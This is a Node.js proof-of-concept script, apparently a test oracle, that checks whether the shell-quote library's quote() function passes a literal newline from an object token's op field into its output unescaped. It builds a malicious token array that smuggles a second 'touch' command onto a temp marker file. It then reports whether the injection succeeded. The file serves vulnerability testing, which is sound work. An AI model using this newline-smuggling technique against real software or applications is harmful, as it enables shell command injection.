'use strict';
const shellQuote = require('shell-quote');
const path = require('node:path');

const MARKER = 'SQ_MARKER_' + process.pid + '_' + Date.now();

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign usage first: prove quote() works normally with plain strings and a safe object token.
  const benignResult = shellQuote.quote(['echo', 'hello', MARKER]);
  if (typeof benignResult !== 'string' || benignResult.indexOf(MARKER) === -1) {
    throw new Error('benign quote() did not produce expected output');
  }

  // Also exercise a benign object token (a documented, safe operator) to confirm that path works too.
  const benignObjToken = shellQuote.quote(['echo', { op: '&&' }, 'world']);
  if (typeof benignObjToken !== 'string' || benignObjToken.indexOf('&&') === -1) {
    throw new Error('benign object-token quote() did not produce expected output');
  }

  // Benign operations succeeded.
  operation_completed = true;

  // Malicious input: an object token whose .op contains a literal newline, simulating
  // attacker-influenced data reaching quote() via a deserialized argument array or envFn splice.
  const injectedMarkerFile = path.join(require('node:os').tmpdir(), MARKER + '_INJECTED');
  const maliciousOp = '\n'; // literal newline acting as command separator in POSIX shells
  const maliciousTokens = [
    'echo',
    'safe',
    { op: maliciousOp },
    'touch ' + injectedMarkerFile
  ];

  let maliciousResult;
  try {
    maliciousResult = shellQuote.quote(maliciousTokens);
  } catch (innerErr) {
    // Patched version may throw on invalid/unknown operator tokens - that counts as blocked.
    evidence = 'quote() rejected malicious object token after benign calls succeeded: ' + String(innerErr && innerErr.message);
    exploit_succeeded = false;
    finish();
    return;
  }

  // Determine if the raw, unescaped newline made it into the output string.
  // If the newline is unescaped (i.e. appears literally, not as a backslash-escaped sequence),
  // a downstream shell consumer would treat it as a command separator -> injection succeeded.
  const rawNewlinePresent = maliciousResult.indexOf('\n') !== -1;
  const escapedNewlinePresent = maliciousResult.indexOf('\\\n') !== -1 || maliciousResult.indexOf('\\n') !== -1;

  if (rawNewlinePresent && !escapedNewlinePresent) {
    exploit_succeeded = true;
    evidence = 'quote() emitted an unescaped literal newline from object .op, enabling shell command injection: ' +
      JSON.stringify(maliciousResult);
  } else {
    exploit_succeeded = false;
    evidence = 'quote() output did not contain an unescaped literal newline; result: ' + JSON.stringify(maliciousResult);
  }

  finish();
} catch (err) {
  // Any unexpected exception during setup or benign operation means operation_completed stays false.
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'Unexpected exception: ' + String(err && err.message ? err.message : err);
  finish();
}

function finish() {
  const result = {
    operation_completed: operation_completed,
    exploit_succeeded: exploit_succeeded,
    evidence: evidence
  };
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}
